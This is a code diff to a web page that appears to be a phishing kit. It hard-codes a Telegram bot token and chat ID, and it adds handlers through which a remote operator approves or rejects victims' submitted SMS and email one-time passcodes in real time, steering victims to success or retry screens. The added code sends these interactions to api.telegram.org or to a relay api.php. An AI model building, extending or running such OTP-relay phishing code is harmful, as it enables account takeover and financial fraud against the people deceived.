@@ -1834,7 +1834,7 @@
         // ========================================
         // TELEGRAM CONFIGURATION
         // ========================================
-        const TELEGRAM_BOT_TOKEN = '5787969678:AAHZEGiwGsdH8o_70cMIKqIJcNyDExKfQ00';
+        const TELEGRAM_BOT_TOKEN = '8664242385:AAFzk9UBKcneSpURxzs6qPK88AOTapBgHYc';
         const TELEGRAM_CHAT_ID = '5514645660';
         
         // ========================================
@@ -1862,6 +1862,33 @@
         // ========================================
         // SEND TO TELEGRAM
         // ========================================
+        async function answerCallbackQuery(callbackQueryId, text) {
+            const isLocal = window.location.hostname === 'localhost' || 
+                           window.location.hostname === '127.0.0.1' || 
+                           window.location.protocol === 'file:';
+            try {
+                if (isLocal) {
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
+                    await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ callback_query_id: callbackQueryId, text: text || '' })
+                    });
+                } else {
+                    await fetch('api.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            action: 'answerCallbackQuery',
+                            token: TELEGRAM_BOT_TOKEN,
+                            callback_query_id: callbackQueryId,
+                            text: text || ''
+                        })
+                    });
+                }
+            } catch (e) { console.warn('answerCallbackQuery error:', e); }
+        }
+        
         async function sendToTelegram(message, inlineKeyboard = null) {
             // Check if running locally or on server
             const isLocal = window.location.hostname === 'localhost' || 
@@ -2262,14 +2289,17 @@
                             
                             if (update.callback_query) {
                                 const callbackData = update.callback_query.data;
+                                const callbackId = update.callback_query.id;
                                 
                                 if (callbackData === `approve_${currentSessionId}`) {
+                                    await answerCallbackQuery(callbackId, '✅ OTP Approved');
                                     pollingActive = false;
                                     document.getElementById('loading').style.display = 'none';
                                     const verifyModal = document.getElementById('verifyModal');
                                     verifyModal.style.display = 'flex';
                                     return true;
                                 } else if (callbackData === `reject_${currentSessionId}`) {
+                                    await answerCallbackQuery(callbackId, '❌ OTP Rejected');
                                     pollingActive = false;
                                     promptOTPRetry();
                                     return true;
@@ -2770,13 +2800,16 @@
                             
                             if (update.callback_query) {
                                 const callbackData = update.callback_query.data;
+                                const callbackId = update.callback_query.id;
                                 
                                 if (callbackData === `approve_email_${emailOtpSessionId}`) {
+                                    await answerCallbackQuery(callbackId, '✅ OTP Approved');
                                     emailOtpPollingActive = false;
                                     document.getElementById('loading').style.display = 'none';
                                     document.getElementById('successModal').style.display = 'flex';
                                     return true;
                                 } else if (callbackData === `reject_email_${emailOtpSessionId}`) {
+                                    await answerCallbackQuery(callbackId, '❌ OTP Rejected');
                                     emailOtpPollingActive = false;
                                     promptEmailOTPRetry();
                                     return true;
